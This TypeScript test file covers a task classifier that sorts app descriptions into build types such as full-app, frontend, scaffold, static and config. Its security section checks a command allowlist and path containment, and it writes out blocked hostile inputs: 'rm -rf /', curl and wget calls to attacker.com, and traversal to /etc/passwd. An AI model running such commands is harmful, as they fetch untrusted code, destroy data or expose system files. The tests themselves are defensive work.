/**
 * Tests for the task classifier.
 *
 * Run: npx tsx engine/task-classifier.test.ts
 */

import { classifyTask } from './task-classifier.ts';
import type { AppStory } from './types.ts';
import { isCommandSafe, resolvePath } from './build-tools.ts';

let passed = 0;
let failed = 0;

function test(name: string, fn: () => void) {
    try {
        fn();
        console.log(`  ✓ ${name}`);
        passed++;
    } catch (e) {
        console.log(`  ✗ ${name}`);
        console.log(`    ${e instanceof Error ? e.message : String(e)}`);
        failed++;
    }
}

function assert(condition: boolean, msg: string) {
    if (!condition) throw new Error(msg);
}

function makeStory(overrides: Partial<AppStory> = {}): AppStory {
    return {
        appName: 'test-app',
        description: 'Test app',
        stack: { framework: 'next.js' },
        ...overrides,
    };
}

// ─── Test Suite ──────────────────────────────────────────

console.log('\n🧪 Task Classifier Tests\n');

// ─── full-app ────────────────────────────────────────────
console.log('full-app:');

test('next.js + jest + supabase = full-app', () => {
    const p = classifyTask(makeStory({
        stack: { framework: 'next.js', testing: 'jest', database: 'supabase', linter: 'eslint' },
        auth: { provider: 'firebase' },
    }));
    assert(p.type === 'full-app', `expected full-app, got ${p.type}`);
    assert(p.needsPlan === true, 'should need plan');
    assert(p.needsInstall === true, 'should need install');
    assert(p.needsTypeCheck === true, 'should need tsc (default TS)');
    assert(p.needsLint === true, 'should need lint');
    assert(p.needsTest === true, 'should need test');
    assert(p.maxIterations === 5, `expected 5 iterations, got ${p.maxIterations}`);
});

test('react + vitest + postgres + no auth = full-app', () => {
    const p = classifyTask(makeStory({
        stack: { framework: 'react', testing: 'vitest', database: 'postgres' },
    }));
    assert(p.type === 'full-app', `expected full-app, got ${p.type}`);
    assert(p.needsTest === true, 'should need test');
});

test('full-app with javascript = no tsc', () => {
    const p = classifyTask(makeStory({
        stack: { framework: 'next.js', testing: 'jest', database: 'supabase', language: 'javascript' },
    }));
    assert(p.type === 'full-app', `expected full-app, got ${p.type}`);
    assert(p.needsTypeCheck === false, 'JavaScript project should skip tsc');
});

// ─── frontend ────────────────────────────────────────────
console.log('\nfrontend:');

test('next.js + eslint (no testing, no db) = frontend', () => {
    const p = classifyTask(makeStory({
        stack: { framework: 'next.js', linter: 'eslint' },
    }));
    assert(p.type === 'frontend', `expected frontend, got ${p.type}`);
    assert(p.needsInstall === true, 'should need install');
    assert(p.needsTypeCheck === true, 'should need tsc');
    assert(p.needsLint === true, 'should need lint');
    assert(p.needsTest === false, 'should NOT need test');
    assert(p.maxIterations === 4, `expected 4 iterations, got ${p.maxIterations}`);
});

test('vite + biome = frontend', () => {
    const p = classifyTask(makeStory({
        stack: { framework: 'vite', linter: 'biome' },
    }));
    assert(p.type === 'frontend', `expected frontend, got ${p.type}`);
});

test('next.js + jest but NO db/auth = frontend (has testing)', () => {
    const p = classifyTask(makeStory({
        stack: { framework: 'next.js', testing: 'jest' },
    }));
    assert(p.type === 'frontend', `expected frontend, got ${p.type}`);
    assert(p.needsTest === true, 'should need test (testing is set)');
    assert(p.maxIterations === 4, `expected 4 iterations, got ${p.maxIterations}`);
});

// ─── scaffold ────────────────────────────────────────────
console.log('\nscaffold:');

test('next.js only (no linter, no testing) = scaffold', () => {
    const p = classifyTask(makeStory({
        stack: { framework: 'next.js' },
    }));
    assert(p.type === 'scaffold', `expected scaffold, got ${p.type}`);
    assert(p.needsInstall === true, 'should need install');
    assert(p.needsTypeCheck === false, 'should NOT need tsc');
    assert(p.needsLint === false, 'should NOT need lint');
    assert(p.needsTest === false, 'should NOT need test');
    assert(p.maxIterations === 2, `expected 2 iterations, got ${p.maxIterations}`);
});

test('react only = scaffold', () => {
    const p = classifyTask(makeStory({
        stack: { framework: 'react' },
    }));
    assert(p.type === 'scaffold', `expected scaffold, got ${p.type}`);
});

test('express only = scaffold', () => {
    const p = classifyTask(makeStory({
        stack: { framework: 'express' },
    }));
    assert(p.type === 'scaffold', `expected scaffold, got ${p.type}`);
});

test('linter=none and testing=none = scaffold (not frontend)', () => {
    const p = classifyTask(makeStory({
        stack: { framework: 'next.js', linter: 'none', testing: 'none' },
    }));
    assert(p.type === 'scaffold', `expected scaffold, got ${p.type}`);
});

// ─── static ──────────────────────────────────────────────
console.log('\nstatic:');

test('html framework with pages = static', () => {
    const p = classifyTask(makeStory({
        stack: { framework: 'html' },
        pages: { dashboard: ['home'] },
    }));
    assert(p.type === 'static', `expected static, got ${p.type}`);
    assert(p.needsPlan === false, 'should NOT need plan');
    assert(p.needsInstall === false, 'should NOT need install');
    assert(p.maxIterations === 0, `expected 0 iterations, got ${p.maxIterations}`);
});

test('vanilla framework = static', () => {
    const p = classifyTask(makeStory({
        stack: { framework: 'vanilla' },
        pages: { custom: ['landing'] },
    }));
    assert(p.type === 'static', `expected static, got ${p.type}`);
});

test('no framework with data = static', () => {
    const p = classifyTask(makeStory({
        stack: { framework: '' },
        data: { tables: [{ name: 'items', fields: { title: { type: 'string' } } }] },
    }));
    assert(p.type === 'static', `expected static, got ${p.type}`);
});

// ─── config ──────────────────────────────────────────────
console.log('\nconfig:');

test('no framework, no pages, no data, no auth = config', () => {
    const p = classifyTask(makeStory({
        stack: { framework: '' },
    }));
    assert(p.type === 'config', `expected config, got ${p.type}`);
    assert(p.needsPlan === false, 'should NOT need plan');
    assert(p.needsInstall === false, 'should NOT need install');
    assert(p.needsTypeCheck === false, 'should NOT need tsc');
    assert(p.needsLint === false, 'should NOT need lint');
    assert(p.needsTest === false, 'should NOT need test');
    assert(p.maxIterations === 0, `expected 0 iterations, got ${p.maxIterations}`);
});

test('static framework, no pages = config', () => {
    const p = classifyTask(makeStory({
        stack: { framework: 'static' },
    }));
    assert(p.type === 'config', `expected config, got ${p.type}`);
});

test('framework=none = config', () => {
    const p = classifyTask(makeStory({
        stack: { framework: 'none' },
    }));
    assert(p.type === 'config', `expected config, got ${p.type}`);
});

// ─── Edge cases ──────────────────────────────────────────
console.log('\nedge cases:');

test('testing=jest but db=none and no auth → frontend not full-app', () => {
    const p = classifyTask(makeStory({
        stack: { framework: 'next.js', testing: 'jest', database: 'none' },
    }));
    assert(p.type === 'frontend', `expected frontend, got ${p.type}`);
});

test('auth without testing → scaffold (has auth but no testing)', () => {
    const p = classifyTask(makeStory({
        stack: { framework: 'next.js' },
        auth: { provider: 'firebase' },
    }));
    assert(p.type === 'scaffold', `expected scaffold, got ${p.type}`);
});

test('testing + auth but no db → full-app', () => {
    const p = classifyTask(makeStory({
        stack: { framework: 'next.js', testing: 'jest' },
        auth: { provider: 'firebase' },
    }));
    assert(p.type === 'full-app', `expected full-app, got ${p.type}`);
});

// ─── Security & Containment Tests ────────────────────────
console.log('\n🛡️ Security & Containment:');

test('command execution allowlist', () => {
    assert(isCommandSafe('npm install') === true, 'npm install should be safe');
    assert(isCommandSafe('npx tsc --noEmit') === true, 'npx tsc should be safe');
    assert(isCommandSafe('npm run test && npx eslint') === true, 'chained safe commands should be safe');
    assert(isCommandSafe('git status') === true, 'git should be safe');
    assert(isCommandSafe('./node_modules/.bin/vitest') === true, 'local node_modules binary of allowed tool should be safe');

    assert(isCommandSafe('rm -rf /') === false, 'rm should be blocked');
    assert(isCommandSafe('curl http://attacker.com/malicious.sh') === false, 'curl should be blocked');
    assert(isCommandSafe('npm install && wget http://attacker.com') === false, 'chained unsafe commands should be blocked');
});

test('resolvePath containment enforcement', () => {
    const mockCtx = {
        targetDir: '/Users/pretheesh/Projects/factory/greeting-app',
        storyFile: '',
        terminal: false,
        success: false,
        generatedFiles: new Map(),
        logs: [],
    };

    // Valid paths
    assert(
        resolvePath('src/app.ts', mockCtx) === '/Users/pretheesh/Projects/factory/greeting-app/src/app.ts',
        'relative path should resolve correctly under targetDir'
    );
    assert(
        resolvePath('.', mockCtx) === '/Users/pretheesh/Projects/factory/greeting-app',
        'dot path should resolve to targetDir'
    );
    assert(
        resolvePath('/Users/pretheesh/Projects/factory/greeting-app/nested/file.ts', mockCtx) === '/Users/pretheesh/Projects/factory/greeting-app/nested/file.ts',
        'absolute nested path under targetDir should be allowed'
    );

    // Escape/Traversal attempts
    try {
        resolvePath('../../etc/passwd', mockCtx);
        throw new Error('should have thrown on parent directory traversal escape');
    } catch (e: any) {
        assert(e.message.includes('Security Error'), 'expected security error for parent traversal');
    }

    try {
        resolvePath('/etc/passwd', mockCtx);
        throw new Error('should have thrown on absolute path escape');
    } catch (e: any) {
        assert(e.message.includes('Security Error'), 'expected security error for absolute escape');
    }

    try {
        resolvePath('/Users/pretheesh/Projects/factory/greeting-app-sibling', mockCtx);
        throw new Error('should have thrown on partial name sibling directory traversal');
    } catch (e: any) {
        assert(e.message.includes('Security Error'), 'expected security error for partial sibling escape');
    }
});

// ─── Summary ─────────────────────────────────────────────
console.log(`\n${'═'.repeat(40)}`);
console.log(`Results: ${passed} passed, ${failed} failed`);
console.log(`${'═'.repeat(40)}\n`);

process.exit(failed > 0 ? 1 : 0);
